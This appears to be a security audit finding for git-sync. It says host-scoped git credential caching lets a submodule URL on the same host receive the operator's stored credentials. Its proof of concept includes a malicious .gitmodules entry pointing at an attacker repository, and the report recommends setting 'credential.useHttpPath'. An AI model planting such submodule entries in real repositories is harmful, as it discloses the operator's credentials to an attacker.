### Title
Host-scoped (not path-scoped) git credential storage allows credential disclosure to attacker-controlled repositories via submodule URLs - (File: main.go)

### Summary
The ParaSpace report's root cause is a signed data structure that is scoped too broadly (missing a marketplace identifier), letting a value meant for one context be replayed in another, unintended context. `git-sync` has the same class of flaw in its credential-scoping model: credentials supplied via `--credential`, `--askpass-url`, or GitHub App auth are stored into git's own credential cache keyed only by URL, but git-sync never sets `credential.useHttpPath`, so git's *default* credential matching is by protocol+host only, not the full path. An attacker who controls content that is fetched via submodules (`.gitmodules`) can therefore point a submodule at a different repo path on the *same host* and receive the operator's stored username/password.

### Finding Description
`git-sync` stores every authentication credential the same way, through `StoreCredentials`, which feeds a `url=...` record into `git credential approve`: [1](#0-0) 

This is invoked from three places, each keyed to a specific URL that the operator intends to scope narrowly:
- Per-credential entries from `--credential`, explicitly documented as being "for specific URLs, for example when using submodules": [2](#0-1) 
- The `--askpass-url` flow, scoped to `git.repo`: [3](#0-2) 
- GitHub App token refresh, also scoped to `git.repo`: [4](#0-3) 

Git's credential subsystem, however, only matches on protocol+host by default — path is only included in the match key when `credential.useHttpPath` is enabled. `SetupDefaultGitConfigs` configures `credential.helper` (cache with a 1-hour timeout) and `core.askPass`, but never sets `credential.useHttpPath`: [5](#0-4) 

Because git-sync supports submodules and executes `git submodule update --init [--recursive]` using URLs sourced entirely from repository content (`.gitmodules`), which is attacker-controlled data reachable via any commit/PR/ref the tool syncs: [6](#0-5) 

an attacker who can push (or get merged) a commit into the tracked repo/ref can add or modify a submodule URL to point at a different path on the same host as one for which the operator has stored narrower credentials (e.g., `--credential='{"url":"https://git.example.com/org/repoA",...}'`). When git internally resolves credentials for the submodule fetch, it will match on host alone and hand the same username/password to the attacker-chosen path — exactly the "missing scope identifier → cross-context replay" pattern described in the ParaSpace report, just applied to git's credential model instead of an EIP-712 signature.

### Impact Explanation
If the attacker-chosen submodule path resolves to a git server/path they control (common on shared self-hosted GitLab/Gitea/Bitbucket instances, or any multi-tenant git host), the leaked HTTP Basic-Auth credentials (username/password, GitHub App installation token, or askpass-url secret) are disclosed to that attacker-controlled endpoint. This is a credential/token disclosure impact, one of the explicitly accepted outcomes.

### Likelihood Explanation
Exploitability depends on the operator's environment: it requires (a) git-sync configured with `--credential`, `--askpass-url`, or GitHub App auth for one repo/host, (b) submodules enabled (`--submodules`), and (c) the synced ref containing attacker-influenced `.gitmodules` content pointing at another path/repo on the same host that the attacker controls or can observe. This is realistic in shared internal git hosting scenarios (single GitLab/Gitea instance serving multiple orgs/repos) where an operator uses per-URL credentials for submodules, and is consistent with a known, long-standing git behavior (credential matching is host-scoped, not path-scoped, unless `credential.useHttpPath` is explicitly set) that git-sync does not mitigate.

### Recommendation
Set `credential.useHttpPath=true` globally (or per stored credential entry, e.g. `credential.<url>.useHttpPath=true`) in `SetupDefaultGitConfigs`, so git's credential matching is scoped to protocol+host+path, matching the granularity the `--credential` flag documentation already promises ("for specific URLs, for example when using submodules"). Additionally, consider restricting submodule URL protocols/hosts (e.g., via `GIT_ALLOW_PROTOCOL` or an explicit allow-list of hosts) so an attacker-controlled `.gitmodules` cannot redirect fetches to arbitrary hosts/paths at all.

### Proof of Concept
1. Operator runs:
   `git-sync --repo=https://git.example.com/org/main-repo --submodules=recursive --credential='{"url":"https://git.example.com/org/repoA","username":"svc","password-file":"/creds/pw"}'`
2. `git-sync` calls `StoreCredentials(ctx, "https://git.example.com/org/repoA", "svc", "<password>")` → `git credential approve`, cached by git for 1 hour (`credential.helper = cache --timeout 3600`), keyed by protocol+host only.
3. Attacker (with push/merge rights to `main-repo`, or via a malicious PR that gets synced) adds `.gitmodules`:
   ```
   [submodule "evil"]
     path = evil
     url = https://git.example.com/attacker-org/evil-repo
   ```
4. On the next sync, `configureWorktree` runs `git submodule update --init --recursive`, which fetches `https://git.example.com/attacker-org/evil-repo`.
5. Because `credential.useHttpPath` was never set, git's credential helper matches by host (`git.example.com`) alone and supplies `svc`/`<password>` to the attacker's repo, disclosing the operator's `repoA` credentials to the attacker.

// StoreCredentials stores a username and password for later use.
func (git *repoSync) StoreCredentials(ctx context.Context, url, username, password string) error {
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}

	return nil
}
